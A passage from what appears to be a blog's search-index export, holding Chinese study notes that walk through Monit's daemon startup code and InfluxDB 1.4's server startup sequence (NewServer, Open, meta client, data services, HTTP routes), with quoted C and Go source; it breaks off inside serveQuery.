        char *pattern = args[++optind];\n                if (! pattern) {\n                        printf(\"Invalid syntax - usage: procmatch \\\"<pattern>\\\"\\n\");\n                        exit(1);\n                }\n                ProcessTree_testMatch(pattern);\n        } else if (IS(action, \"quit\")) {\n                kill_daemon(SIGTERM);\n        } else if (IS(action, \"validate\")) {\n                if (do_wakeupcall()) {\n                        char *service = args[++optind];\n                        HttpClient_status(Run.mygroup, service);\n                } else {\n                        _validateOnce();\n                }\n                exit(1);\n        } else {\n                LogError(\"Invalid argument -- %s  (-h will show valid arguments)\\n\", action);\n                exit(1);\n        }\n}\n```\n\naction= start stop monitor unmonitor restart 通过维护一个服务列表发送post请求给服务端来启动服务。\n\ndo_default主要启动服务的函数\n\n```c\n/**\n * Default action - become a daemon if defined in the Run object and\n * run validate() between sleeps. If not, just run validate() once.\n * Also, if specified, start the monit http server if in deamon mode.\n */\nstatic void do_default() {\n        if (Run.flags & Run_Daemon) {\n                if (do_wakeupcall())\n                        exit(0);\n\n                Run.flags &= ~Run_Once;\n                if (can_http()) {\n                        if (Run.httpd.flags & Httpd_Net)\n                                LogInfo(\"Starting Monit %s daemon with http interface at [%s]:%d\\n\", VERSION, Run.httpd.socket.net.address ? Run.httpd.socket.net.address : \"*\", Run.httpd.socket.net.port);\n                        else if (Run.httpd.flags & Httpd_Unix)\n                                LogInfo(\"Starting Monit %s daemon with http interface at %s\\n\", VERSION, Run.httpd.socket.unix.path);\n                } else {\n                        LogInfo(\"Starting Monit %s daemon\\n\", VERSION);\n                }\n\n                if (! (Run.flags & Run_Foreground))\n                        daemonize();\n\n                if (! file_createPidFile(Run.files.pid)) {\n                        LogError(\"Monit daemon died\\n\");\n                        exit(1);\n                }\n\n                if (! State_open())\n                        exit(1);\n                State_restore();\n\n                atexit(file_finalize);\n\n                if (Run.startdelay && State_reboot()) {\n                        time_t now = Time_now();\n                        time_t delay = now + Run.startdelay;\n\n                        LogInfo(\"Monit will delay for %ds on first start after reboot ...\\n\", Run.startdelay);\n\n                        /* sleep can be interrupted by signal => make sure we paused long enough */\n                        while (now < delay) {\n                                sleep((unsigned int)(delay - now));\n                                if (Run.flags & Run_Stopped)\n                                        do_exit(false);\n                                now = Time_now();\n                        }\n                }\n\n                if (can_http())\n                        monit_http(Httpd_Start);\n\n                /* send the monit startup notification */\n                Event_post(Run.system, Event_Instance, State_Changed, Run.system->action_MONIT_START, \"Monit %s started\", VERSION);\n\n                if (Run.mmonits) {\n                        Thread_create(heartbeatThread, heartbeat, NULL);\n                        heartbeatRunning = true;\n                }\n\n                while (true) {\n                        validate();\n\n                        /* In the case that there is no pending action then sleep */\n                        if (! (Run.flags & Run_ActionPending) && ! interrupt())\n                                sleep(Run.polltime);\n\n                        if (Run.flags & Run_DoWakeup) {\n                                Run.flags &= ~Run_DoWakeup;\n                                LogInfo(\"Awakened by User defined signal 1\\n\");\n                        }\n\n                        if (Run.flags & Run_Stopped) {\n                                do_exit(true);\n                        } else if (Run.flags & Run_DoReload) {\n                                do_reinit();\n                        } else {\n                                State_saveIfDirty();\n                        }\n                }\n        } else {\n                _validateOnce();\n        }\n}\n```\n\ndo_wakeupcall调用函数是否需要唤醒进程。\n\ncan_http()判断是否可以启动http.\n\ndaemonize()函数：\n\n```c\n/**\n * Transform a program into a daemon. Inspired by code from Stephen\n * A. Rago's book, Unix System V Network Programming.\n */\nvoid daemonize() {\n        pid_t pid;\n        /*\n         * Become a session leader to lose our controlling terminal\n         */\n        if ((pid = fork ()) < 0) {\n                LogError(\"Cannot fork a new process\\n\");\n                exit (1);\n        } else if (pid != 0) {\n                _exit(0);\n        }\n        setsid();\n        if ((pid = fork ()) < 0) {\n                LogError(\"Cannot fork a new process\\n\");\n                exit (1);\n        } else if (pid != 0) {\n                _exit(0);\n        }\n        /*\n         * Change current directory to the root so that other file systems can be unmounted while we're running\n         */\n        if (chdir(\"/\") < 0) {\n                LogError(\"Cannot chdir to / -- %s\\n\", STRERROR);\n                exit(1);\n        }\n        /*\n         * Attach standard descriptors to /dev/null. Other descriptors should be closed in env.c\n         */\n        Util_redirectStdFds();\n}\n```\n\nfile_createPidFile场景pid文件。\n\n服务数据结构，所有的服务数据结构都在monit.h文件中\n\nyacc flex解析\n\n使用flex词法解析器，yacc语法解析器。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["monitor"],"categories":["monitor"]},{"title":"influxdb","url":"/2020/01/17/influxdb1/","content":"\n### influxdb 启动流程学习笔记\n\n#### 流程分析\n\n本文基于influxdb 1.4来进行分析代码\n\ninfluxdb入口文件在 /cmd/influxd/main.go文件中\n\n```go\n// 主函数\nfunc main() {\n\trand.Seed(time.Now().UnixNano())\n\t//初始化\n\tm := NewMain()\n    // Run \n\tif err := m.Run(os.Args[1:]...); err != nil {\n\t\tfmt.Fprintln(os.Stderr, err)\n\t\tos.Exit(1)\n\t}\n}\n```\n\nNewMain函数初始化一个实例\n\n```go\n// NewMain return a new instance of Main.\nfunc NewMain() *Main {\n\treturn &Main{\n\t\tStdin:  os.Stdin,\n\t\tStdout: os.Stdout,\n\t\tStderr: os.Stderr,\n\t}\n}\n```\n\n主要流程在Run函数中，\n\n```go\n// Run determines and runs the command specified by the CLI args.\nfunc (m *Main) Run(args ...string) error {\n\tname, args := cmd.ParseCommandName(args)\n\n\t// Extract name from args.\n\tswitch name {\n\tcase \"\", \"run\":\n        // 默认执行流程\n\t\tcmd := run.NewCommand()\n\n\t\t// Tell the server the build details.\n\t\tcmd.Version = version\n\t\tcmd.Commit = commit\n\t\tcmd.Branch = branch\n\n        // 执行主要的函数\n\t\tif err := cmd.Run(args...); err != nil {\n\t\t\treturn fmt.Errorf(\"run: %s\", err)\n\t\t}\n\t\t//中断信号量\n\t\tsignalCh := make(chan os.Signal, 1)\n\t\tsignal.Notify(signalCh, os.Interrupt, syscall.SIGTERM)\n\t\tcmd.Logger.Info(\"Listening for signals\")\n\n\t\t// Block until one of the signals above is received\n\t\t<-signalCh\n\t\tcmd.Logger.Info(\"Signal received, initializing clean shutdown...\")\n\t\tgo cmd.Close()\n\n\t\t// Block again until another signal is received, a shutdown timeout elapses,\n\t\t// or the Command is gracefully closed\n\t\tcmd.Logger.Info(\"Waiting for clean shutdown...\")\n\t\tselect {\n\t\tcase <-signalCh:\n\t\t\tcmd.Logger.Info(\"Second signal received, initializing hard shutdown\")\n\t\tcase <-time.After(time.Second * 30):\n\t\t\tcmd.Logger.Info(\"Time limit reached, initializing hard shutdown\")\n\t\tcase <-cmd.Closed:\n\t\t\tcmd.Logger.Info(\"Server shutdown completed\")\n\t\t}\n\n\t\t// goodbye.\n\n\tcase \"backup\":\n        //备份\n\t\tname := backup.NewCommand()\n\t\tif err := name.Run(args...); err != nil {\n\t\t\treturn fmt.Errorf(\"backup: %s\", err)\n\t\t}\n\tcase \"restore\":\n        //恢复\n\t\tname := restore.NewCommand()\n\t\tif err := name.Run(args...); err != nil {\n\t\t\treturn fmt.Errorf(\"restore: %s\", err)\n\t\t}\n\tcase \"config\":\n        //打印当前配置\n\t\tif err := run.NewPrintConfigCommand().Run(args...); err != nil {\n\t\t\treturn fmt.Errorf(\"config: %s\", err)\n\t\t}\n\tcase \"version\":\n\t\tif err := NewVersionCommand().Run(args...); err != nil {\n\t\t\treturn fmt.Errorf(\"version: %s\", err)\n\t\t}\n\tcase \"help\":\n\t\tif err := help.NewCommand().Run(args...); err != nil {\n\t\t\treturn fmt.Errorf(\"help: %s\", err)\n\t\t}\n\tdefault:\n\t\treturn fmt.Errorf(`unknown command \"%s\"`+\"\\n\"+`Run 'influxd help' for usage`+\"\\n\\n\", name)\n\t}\n\n\treturn nil\n}\n```\n\n先分析run部分：\n\n```go\n// Run parses the config from args and runs the server.\nfunc (cmd *Command) Run(args ...string) error {\n\t// Parse the command line flags.\n\toptions, err := cmd.ParseFlags(args...)\n\tif err != nil {\n\t\treturn err\n\t}\n\n    //解析配置文件\n\tconfig, err := cmd.ParseConfig(options.GetConfigPath())\n\tif err != nil {\n\t\treturn fmt.Errorf(\"parse config: %s\", err)\n\t}\n\n\t// Apply any environment variables on top of the parsed config\n\tif err := config.ApplyEnvOverrides(cmd.Getenv); err != nil {\n\t\treturn fmt.Errorf(\"apply env config: %v\", err)\n\t}\n\n\t// Propogate the top-level join options down to the meta config\n    //解析join的集群环境下的iplist\n\tif config.Join != \"\" {\n\t\tconfig.Meta.JoinPeers = strings.Split(config.Join, \",\")\n\t}\n\n\t// Command-line flags for -join and -hostname override the config\n\t// and env variable\n\tif options.Join != \"\" {\n\t\tconfig.Meta.JoinPeers = strings.Split(options.Join, \",\")\n\t}\n\n    // 解析本地hostname\n\tif options.Hostname != \"\" {\n\t\tconfig.Hostname = options.Hostname\n\t}\n\n\t// Propogate the top-level hostname down to dependendent configs\n\tconfig.Meta.RemoteHostname = config.Hostname\n\n\t// Validate the configuration.\n    // 检查各个配置是否为空\n\tif err := config.Validate(); err != nil {\n\t\treturn fmt.Errorf(\"%s. To generate a valid configuration file run `influxd config > influxdb.generated.conf`\", err)\n\t}\n\n\tvar logErr error\n\tif cmd.Logger, logErr = config.Logging.New(cmd.Stderr); logErr != nil {\n\t\t// assign the default logger\n\t\tcmd.Logger = logger.New(cmd.Stderr)\n\t}\n\n\t// Attempt to run pprof on :6060 before startup if debug pprof enabled.\n    //是否开启pprof\n\tif config.HTTPD.DebugPprofEnabled {\n\t\truntime.SetBlockProfileRate(int(1 * time.Second))\n\t\truntime.SetMutexProfileFraction(1)\n\t\tgo func() { http.ListenAndServe(\"localhost:6060\", nil) }()\n\t}\n\n\t// Print sweet InfluxDB logo.\n    // 打印logo\n\tif !config.Logging.SuppressLogo && logger.IsTerminal(cmd.Stdout) {\n\t\tfmt.Fprint(cmd.Stdout, logo)\n\t}\n\n\t// Mark start-up in log.\n\tcmd.Logger.Info(\"InfluxDB starting\",\n\t\tzap.String(\"version\", cmd.Version),\n\t\tzap.String(\"branch\", cmd.Branch),\n\t\tzap.String(\"commit\", cmd.Commit))\n\tcmd.Logger.Info(\"Go runtime\",\n\t\tzap.String(\"version\", runtime.Version()),\n\t\tzap.Int(\"maxprocs\", runtime.GOMAXPROCS(0)))\n\n\t// If there was an error on startup when creating the logger, output it now.\n\tif logErr != nil {\n\t\tcmd.Logger.Error(\"Unable to configure logger\", zap.Error(logErr))\n\t}\n\n\t// Write the PID file.\n    // 写入pid文件\n\tif err := cmd.writePIDFile(options.PIDFile); err != nil {\n\t\treturn fmt.Errorf(\"write pid file: %s\", err)\n\t}\n\tcmd.pidfile = options.PIDFile\n\n\tif config.HTTPD.PprofEnabled {\n\t\t// Turn on block and mutex profiling.\n\t\truntime.SetBlockProfileRate(int(1 * time.Second))\n\t\truntime.SetMutexProfileFraction(1) // Collect every sample\n\t}\n\n\t// Create server from config and start it.\n    // 初始化服务器\n\tbuildInfo := &BuildInfo{\n\t\tVersion: cmd.Version,\n\t\tCommit:  cmd.Commit,\n\t\tBranch:  cmd.Branch,\n\t\tTime:    cmd.BuildTime,\n\t}\n\ts, err := NewServer(config, buildInfo)\n\tif err != nil {\n\t\treturn fmt.Errorf(\"create server: %s\", err)\n\t}\n\ts.Logger = cmd.Logger\n\ts.CPUProfile = options.CPUProfile\n\ts.MemProfile = options.MemProfile\n     // 启动\n\tif err := s.Open(); err != nil {\n\t\treturn fmt.Errorf(\"open server: %s\", err)\n\t}\n\tcmd.Server = s\n\n\t// Begin monitoring the server's error channel.\n\tgo cmd.monitorServerErrors()\n\n\treturn nil\n}\n```\n\n初始化函数NewServer\n\n```go\n// NewServer returns a new instance of Server built from a config.\nfunc NewServer(c *Config, buildInfo *BuildInfo) (*Server, error) {\n\t// We need to ensure that a meta directory always exists even if\n\t// we don't start the meta store.  node.json is always stored under\n\t// the meta directory.\n    // 建立元数据目录，并加权\n\tif err := os.MkdirAll(c.Meta.Dir, 0777); err != nil {\n\t\treturn nil, fmt.Errorf(\"mkdir all: %s\", err)\n\t}\n\n\t// 0.10-rc1 and prior would sometimes put the node.json at the root\n\t// dir which breaks backup/restore and restarting nodes.  This moves\n\t// the file from the root so it's always under the meta dir.\n    //移动和恢复节点信息\n\toldPath := filepath.Join(filepath.Dir(c.Meta.Dir), \"node.json\")\n\tnewPath := filepath.Join(c.Meta.Dir, \"node.json\")\n\t//修改\n\tif _, err := os.Stat(oldPath); err == nil {\n\t\tif err := os.Rename(oldPath, newPath); err != nil {\n\t\t\treturn nil, err\n\t\t}\n\t}\n// 从磁盘中加载节点信息\n\tnode, err := influxdb.LoadNode(c.Meta.Dir)\n\tif err != nil {\n\t\tif !os.IsNotExist(err) {\n\t\t\treturn nil, err\n\t\t}\n\t\t//不存在则新建\n\t\tnode = influxdb.NewNode(c.Meta.Dir)\n\t}\n\n\t//if err := raftDBExists(c.Meta.Dir); err != nil {\n\t//\treturn nil, err\n\t//}\n\n\t// In 0.10.0 bind-address got moved to the top level. Check\n\t// The old location to keep things backwards compatible\n\tbind := c.BindAddress\n\tif c.Meta.BindAddress != \"\" {\n\t\tbind = c.Meta.BindAddress\n\t}\n\t//判断元数据是否打开\n\tif !c.Data.Enabled && !c.Meta.Enabled {\n\t\treturn nil, fmt.Errorf(\"must run as either meta node or data node or both\")\n\t}\n\t//初始化\n\ts := &Server{\n\t\tbuildInfo: *buildInfo,\n\t\terr:       make(chan error),\n\t\tclosing:   make(chan struct{}),\n\n\t\tNode:        node,\n\t\tBindAddress: bind,\n\n\t\tLogger: logger.New(os.Stderr),\n\n\t\t//MetaClient: meta.NewClient(c.Meta),\n\t\tMetaClient: meta.NewClient(),  \n\n\t\treportingDisabled: c.ReportingDisabled,\n\t\tjoinPeers:         c.Meta.JoinPeers,\n\t\tmetaUseTLS:        c.Meta.HTTPSEnabled,\n\n\t\thttpAPIAddr: c.HTTPD.BindAddress,   // http服务bind地址\n\t\thttpUseTLS:  c.HTTPD.HTTPSEnabled,   //https打开\n\t\ttcpAddr:     bind,\n\n\t\tconfig: c,\n\t}\n\t//初始化元数据服务\n\tif c.Meta.Enabled {\n\t\ts.MetaService = meta.NewService(c.Meta)\n\t\ts.MetaService.Version = s.buildInfo.Version\n\t\ts.MetaService.Node = s.Node\n\t}\n\n\tif c.AdminCluster.Enabled {\n\t\ts.AdminClusterService = admin_cluster.NewService(c.AdminCluster)\n\t\ts.AdminClusterService.Version = s.buildInfo.Version\n\t\ts.AdminClusterService.Handler.MetaClient = s.MetaClient\n\t\ts.AdminClusterService.TCPHandler.MetaClient = s.MetaClient\n\t\ts.AdminClusterService.TCPHandler.Server = s\n\t}\n\t//初始化监控信息\n\ts.Monitor = monitor.New(s, c.Monitor)\n\ts.config.registerDiagnostics(s.Monitor)\n\n\tif c.Data.Enabled {\n        //初始化tsdb\n\t\ts.TSDBStore = tsdb.NewStore(c.Data.Dir)\n\t\ts.TSDBStore.EngineOptions.Config = c.Data\n\n\t\ts.AdminClusterService.TCPHandler.TSDBStore = s.TSDBStore\n\n\t\t// Copy TSDB configuration.\n\t\ts.TSDBStore.EngineOptions.EngineVersion = c.Data.Engine\n\t\ts.TSDBStore.EngineOptions.IndexVersion = c.Data.Index\n\n\t\t// Create the Subscriber service\n\t\ts.Subscriber = subscriber.NewService(c.Subscriber)\n\n\t\t// Set the shard writer\n\t\ts.ShardWriter = cluster.NewShardWriter(time.Duration(c.Cluster.ShardWriterTimeout), c.Cluster.MaxRemoteWriteConnections)\n\n\t\t// Create the hinted handoff service\n\t\ts.HintedHandoff = hh.NewService(c.HintedHandoff, s.ShardWriter, s.MetaClient)\n\t\ts.HintedHandoff.Monitor = s.Monitor\n\n\t\t// Initialize points writer.\n\t\ts.PointsWriter = cluster.NewPointsWriter()\n\t\ts.PointsWriter.WriteTimeout = time.Duration(c.Coordinator.WriteTimeout)\n\t\ts.PointsWriter.TSDBStore = s.TSDBStore\n\t\ts.PointsWriter.ShardWriter = s.ShardWriter\n\t\ts.PointsWriter.HintedHandoff = s.HintedHandoff\n\t\ts.PointsWriter.Node = s.Node\n\n\t\t// Initialize meta executor.\n\t\tmetaExecutor := cluster.NewMetaExecutor()\n\t\tmetaExecutor.MetaClient = s.MetaClient\n\t\tmetaExecutor.Node = s.Node\n\n\t\t// Initialize query executor.\n        // 初始化查询\n\t\ts.QueryExecutor = query.NewExecutor()\n        //初始化集群存储分片\n\t\tclusterShardMapper := &cluster.ClusterShardMapper{\n\t\t\tMetaClient: s.MetaClient,\n\t\t\tTSDBStore:  coordinator.LocalTSDBStore{Store: s.TSDBStore},\n\t\t\tLocalShardMapper: &coordinator.LocalShardMapper{\n\t\t\t\tMetaClient: s.MetaClient,\n\t\t\t\tTSDBStore:  coordinator.LocalTSDBStore{Store: s.TSDBStore},\n\t\t\t},\n\t\t\tNode:               s.Node,\n\t\t\tShardMapperTimeout: time.Duration(s.config.Cluster.ShardMapperTimeout),\n\t\t}\n\t\tclusterShardMapper.WithLogger(s.Logger)\n\t\t//初始化执行\n        //设置最大的查询范围和bucket数目等\n\t\ts.QueryExecutor.StatementExecutor = &cluster.StatementExecutor{\n\t\t\tMetaClient:        s.MetaClient,\n\t\t\tTaskManager:       s.QueryExecutor.TaskManager,\n\t\t\tTSDBStore:         s.TSDBStore,\n\t\t\tShardMapper:       clusterShardMapper,\n\t\t\tMonitor:           s.Monitor,\n\t\t\tPointsWriter:      s.PointsWriter,\n\t\t\tMaxSelectPointN:   c.Coordinator.MaxSelectPointN,\n\t\t\tMaxSelectSeriesN:  c.Coordinator.MaxSelectSeriesN,\n\t\t\tMaxSelectBucketsN: c.Coordinator.MaxSelectBucketsN,\n\t\t\tMetaExecutor:      metaExecutor,\n\t\t}\n\t\ts.QueryExecutor.TaskManager.QueryTimeout = time.Duration(c.Coordinator.QueryTimeout)\n\t\ts.QueryExecutor.TaskManager.LogQueriesAfter = time.Duration(c.Coordinator.LogQueriesAfter)\n\t\ts.QueryExecutor.TaskManager.MaxConcurrentQueries = c.Coordinator.MaxConcurrentQueries\n\n\t\t// Initialize the monitor\n\t\ts.Monitor.Version = s.buildInfo.Version\n\t\ts.Monitor.Commit = s.buildInfo.Commit\n\t\ts.Monitor.Branch = s.buildInfo.Branch\n\t\ts.Monitor.BuildTime = s.buildInfo.Time\n\t\ts.Monitor.PointsWriter = (*monitorPointsWriter)(s.PointsWriter)\n\t}\n\n\treturn s, nil\n}\n```\n\nopen启动服务：\n\n```go\n// Open opens the meta and data store and all services.\nfunc (s *Server) Open() error {\n\t// Start profiling, if set.\n    // linux profile\n\tstartProfile(s.CPUProfile, s.MemProfile)\n\n\t// Open shared TCP connection.\n    // 启动tcp连接\n\tln, err := net.Listen(\"tcp\", s.BindAddress)\n\tif err != nil {\n\t\treturn fmt.Errorf(\"listen: %s\", err)\n\t}\n\ts.Listener = ln\n\n\t// Multiplex listener.\n    // 启动多路复用器\n\tmux := tcp.NewMux()\n\ts.Mux = mux\n\tgo mux.Serve(ln)\n\n\tif s.MetaService != nil {\n        //元数据服务raftlistener初始化\n\t\ts.MetaService.RaftListener = mux.Listen(meta.MuxHeader)\n\n\t\t// Configure logging for all services and clients.\n\t\tif s.config.Meta.LoggingEnabled {\n\t\t\ts.MetaService.WithLogger(s.Logger)\n\t\t}\n\n\t\t// Open meta service.\n        //元数据服务启动\n\t\tif err := s.MetaService.Open(); err != nil {\n\t\t\treturn fmt.Errorf(\"open meta service: %s\", err)\n\t\t}\n\t\tgo s.monitorErrorChan(s.MetaService.Err())\n\t}\n\n\tif s.AdminClusterService != nil {\n\t\t// Configure logging for all services and clients.\n\t\tif s.config.AdminCluster.ClusterTracing {\n\t\t\ts.AdminClusterService.WithLogger(s.Logger)\n\t\t}\n\t\t// TCP listen\n\t\ts.AdminClusterService.TCPHandler.Listener = s.Mux.Listen(admin_cluster.MuxHeader)\n\n\t\t// Open admin cluster service.\n        //启动集群admin_cluster服务\n\t\tif err := s.AdminClusterService.Open(); err != nil {\n\t\t\treturn fmt.Errorf(\"open admin cluster service: %s\", err)\n\t\t}\n\t}\n\n\t// initialize MetaClient.\n    //初始化元数据客户端，用于设置集群功能，加入集群等功能。\n\tif err = s.initializeMetaClient(); err != nil {\n\t\treturn err\n\t}\n\n\t// Start the reporting service, if not disabled.\n\t//if !s.reportingDisabled {\n\t//\tgo s.startServerReporting()\n\t//}\n\n\treturn nil\n}\n```\n\ninitializeMetaClient函数中：\n\n```go\n// initializeMetaClient will set the MetaClient and join the node to the cluster if needed\nfunc (s *Server) initializeMetaClient() error {\n\t// It's the first time starting up and we need to either join\n\t// the cluster or initialize this node as the first member\n    //如果每天joinpeers，则返回\n\tif len(s.joinPeers) == 0 {\n\t\t// start up a new single node cluster\n\t\tif s.MetaService == nil {\n\t\t\treturn fmt.Errorf(\"server not set to join existing cluster must run also as a meta node\")\n\t\t}\n\t\ts.MetaClient.SetMetaServers([]string{s.MetaService.HTTPAddr()})\n\t\ts.MetaClient.SetTLS(s.metaUseTLS)\n\t} else {\n\t\tvar err error\n\t\tvar joinPeers []string\n\t\tif s.MetaService != nil {\n\t\t\traddr := s.remoteAddr(s.MetaService.HTTPAddr())\n\t\t\tjoinPeers, err = s.filterAddr(s.joinPeers, raddr)\n\t\t\tif err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\t\t} else {\n\t\t\tjoinPeers = s.joinPeers\n\t\t}\n\t\ts.MetaClient.SetMetaServers(joinPeers)\n\t\ts.MetaClient.SetTLS(s.metaUseTLS)\n\t}\n    //打开client\n\tif err := s.MetaClient.Open(); err != nil {\n\t\treturn err\n\t}\n\n\t// if the node ID is > 0 then we need to initialize the metaclient\n\tif s.Node.GetMetaID() > 0 || s.Node.GetDataID() > 0 {\n\t\ts.MetaClient.WaitForDataChanged()\n\t}\n\tif len(s.joinPeers) > 0 {\n\t\ts.MetaClient.SetMetaServers(s.joinPeers)\n\t}\n\tif s.config.Data.Enabled {\n\n\t\tgo func() {\n\t\t\tt := time.NewTicker(time.Second)\n\t\t\tfor {\n\t\t\t\tselect {\n\t\t\t\tcase <-t.C:\n                    //定时器服务，检查是否打开数据服务\n\t\t\t\t\tif _, err := s.MetaClient.DataNode(s.Node.GetDataID()); err == nil {\n\t\t\t\t\t\toerr := s.OpenDataServer()\n\t\t\t\t\t\tif oerr != nil {\n\t\t\t\t\t\t\ts.Logger.Error(\"failed to open data server.\", zap.Error(oerr))\n\t\t\t\t\t\t\tpanic(\"open data server failed\")\n\t\t\t\t\t\t}\n\t\t\t\t\t\ts.Logger.Info(\"data server started\", zap.Uint64(\"node id\", s.Node.GetDataID()))\n\t\t\t\t\t\treturn\n\t\t\t\t\t}\n\t\t\t\tcase <-s.closing:\n\t\t\t\t\treturn\n\t\t\t\t}\n\t\t\t}\n\t\t}()\n\n\t}\n\treturn nil\n}\n```\n\n如果找到数据节点，则启动opendataServer函数，启动数据服务：\n\n```go\nfunc (s *Server) OpenDataServer() error {\n\tif s.TSDBStore != nil && !s.DataServicesOpened {\n\t\ts.DataServicesOpened = true\n\t\t// Append services.\n         // 启动集群服务，初始化所有的服务\n\t\ts.appendClusterService(s.config.Cluster)\n\t\ts.appendMonitorService()\n\t\ts.appendPrecreatorService(s.config.Precreator)\n\t\ts.appendSnapshotterService()\n\t\ts.appendContinuousQueryService(s.config.ContinuousQuery)\n\t\ts.appendAntiEntropyService(s.config.AntiEntropy)\n        // http服务\n\t\ts.appendHTTPDService(s.config.HTTPD)\n\t\ts.appendStorageService(s.config.Storage)\n        //RetentionPolicy\n\t\ts.appendRetentionPolicyService(s.config.Retention)\n\t\tfor _, i := range s.config.GraphiteInputs {\n\t\t\tif err := s.appendGraphiteService(i); err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\t\t}\n\t\tfor _, i := range s.config.CollectdInputs {\n\t\t\ts.appendCollectdService(i)\n\t\t}\n\t\tfor _, i := range s.config.OpenTSDBInputs {\n\t\t\tif err := s.appendOpenTSDBService(i); err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\t\t}\n\t\tfor _, i := range s.config.UDPInputs {\n\t\t\ts.appendUDPService(i)\n\t\t}\n\t\t\n\t\ts.Subscriber.MetaClient = s.MetaClient\n\t\ts.PointsWriter.MetaClient = s.MetaClient\n\t\ts.Monitor.MetaClient = s.MetaClient\n\t\ts.ShardWriter.MetaClient = s.MetaClient\n\t\ts.HintedHandoff.MetaClient = s.MetaClient\n\n\t\ts.ClusterService.Listener = s.Mux.Listen(cluster.MuxHeader)\n\t\ts.SnapshotterService.Listener = s.Mux.Listen(snapshotter.MuxHeader)\n\n\t\t// Configure logging for all services and clients.\n\t\tif s.config.Meta.LoggingEnabled {\n\t\t\ts.MetaClient.WithLogger(s.Logger)\n\t\t}\n\t\ts.TSDBStore.WithLogger(s.Logger)\n\t\tif s.config.Data.QueryLogEnabled {\n\t\t\ts.QueryExecutor.WithLogger(s.Logger)\n\t\t}\n\t\ts.PointsWriter.WithLogger(s.Logger)\n\t\ts.Subscriber.WithLogger(s.Logger)\n\t\ts.HintedHandoff.WithLogger(s.Logger)\n\t\tfor _, svc := range s.Services {\n\t\t\tsvc.WithLogger(s.Logger)\n\t\t}\n\t\ts.SnapshotterService.WithLogger(s.Logger)\n\t\ts.Monitor.WithLogger(s.Logger)\n\n\t\t// Open TSDB store.\n        // tsdb启动\n\t\tif err := s.TSDBStore.Open(); err != nil {\n\t\t\treturn fmt.Errorf(\"open tsdb store: %s\", err)\n\t\t}\n\n\t\t// Open the hinted handoff service\n\t\tif err := s.HintedHandoff.Open(); err != nil {\n\t\t\treturn fmt.Errorf(\"open hinted handoff: %s\", err)\n\t\t}\n\n\t\t// Open the subscriber service\n\t\tif err := s.Subscriber.Open(); err != nil {\n\t\t\treturn fmt.Errorf(\"open subscriber: %s\", err)\n\t\t}\n\n\t\t// Open the points writer service\n\t\tif err := s.PointsWriter.Open(); err != nil {\n\t\t\treturn fmt.Errorf(\"open points writer: %s\", err)\n\t\t}\n\n\t\ts.PointsWriter.AddWriteSubscriber(s.Subscriber.Points())\n\n\t\tfor _, service := range s.Services {\n            //将注册的服务都启动起来，这边调用每个服务的open方法启动起来\n\t\t\tif err := service.Open(); err != nil {\n\t\t\t\treturn fmt.Errorf(\"open service: %s\", err)\n\t\t\t}\n\t\t}\n\t\treturn nil\n\n\t}\n\tif s.TSDBStore == nil {\n\t\treturn fmt.Errorf(\"Data server is not enabled\")\n\t}\n\treturn nil\n}\n```\n\n服务主要有下面这些：\n\n```shell\ncluster\nmonitor\nprecreator\nsnapshotter\ncontinuousquery\nantientropy\nhttp\nstorage\nretentionpolicy\ngraphite\ncollectd\nopentsdb\nudp\nhh\nmeta\n```\n\n每个服务都有open函数，分别启动。\n\n举例来说：\n\nhttp服务初始化函数NewService:\n\n```go\n// NewService returns a new instance of Service.\nfunc NewService(c Config) *Service {\n\ts := &Service{\n\t\taddr:           c.BindAddress,\n\t\thttps:          c.HTTPSEnabled,\n\t\tcert:           c.HTTPSCertificate,\n\t\tkey:            c.HTTPSPrivateKey,\n\t\tlimit:          c.MaxConnectionLimit,\n\t\terr:            make(chan error),\n\t\tunixSocket:     c.UnixSocketEnabled,\n\t\tunixSocketPerm: uint32(c.UnixSocketPermissions),\n\t\tbindSocket:     c.BindSocket,\n\t\tHandler:        NewHandler(c),  //服务启动处理函数\n\t\tLogger:         zap.NewNop(),\n\t}\n\tif s.key == \"\" {\n\t\ts.key = s.cert\n\t}\n\tif c.UnixSocketGroup != nil {\n\t\ts.unixSocketGroup = int(*c.UnixSocketGroup)\n\t}\n\ts.Handler.Logger = s.Logger\n\treturn s\n}\n```\n\nhandler函数：\n\n```go\nfunc NewHandler(c Config) *Handler {\n\th := &Handler{\n\t\tmux:            pat.New(),\n\t\tConfig:         &c,\n\t\tLogger:         zap.NewNop(),\n\t\tCLFLogger:      log.New(os.Stderr, \"[httpd] \", 0),\n\t\tStore:          storage.NewStore(),\n\t\tstats:          &Statistics{},\n\t\trequestTracker: NewRequestTracker(),\n\t\tsema:           make(chan struct{}, 100),\n\t}\n\n\t// Limit the number of concurrent & enqueued write requests.\n\th.writeThrottler = NewThrottler(c.MaxConcurrentWriteLimit, c.MaxEnqueuedWriteLimit)\n\th.writeThrottler.EnqueueTimeout = c.EnqueuedWriteTimeout\n\n\t// Disable the write log if they have been suppressed.\n\twriteLogEnabled := c.LogEnabled\n\tif c.SuppressWriteLog {\n\t\twriteLogEnabled = false\n\t}\n    //所有服务查询的入口函数在这边处理\n    h.AddRoutes([]Route{\n\t\tRoute{\n\t\t\t\"query-options\", // Satisfy CORS checks.\n\t\t\t\"OPTIONS\", \"/query\", false, true, h.serveOptions,\n\t\t},\n\t\tRoute{\n\t\t\t\"query\", // Query serving route.\n\t\t\t\"GET\", \"/query\", true, true, h.serveQuery,\n\t\t},\n\t\tRoute{\n\t\t\t\"query\", // Query serving route.\n\t\t\t\"POST\", \"/query\", true, true, h.serveQuery,\n\t\t},\n\t\tRoute{\n            ....\n\t\"GET\", \"/metrics\", false, true, promhttp.Handler().ServeHTTP,\n\t\t},\n\t}...)\n\n\treturn h\n}\n            \n```\n\n查询函数serveQuery；\n\n```go\n// serveQuery parses an incoming query and, if valid, executes the query.\nfunc (h *Handler) serveQuery(w http.ResponseWriter, r *http.Request, user meta.User) {\n\tatomic.AddInt64(&h.stats.QueryRequests, 1)\n\tdefer func(start time.Time) {\n\t\tatomic.AddInt64(&h.stats.QueryRequestDuration, time.Since(start).Nanoseconds())\n\t}(time.Now())\n\th.requestTracker.Add(r, user)\n\n\t// Retrieve the underlying ResponseWriter or initialize our own.\n\trw, ok := w.(ResponseWriter)\n\tif !ok {\n\t\trw = NewResponseWriter(w, r)\n\t}\n\n\t// Retrieve the node id the query should be executed on.\n\tnodeID, _ := 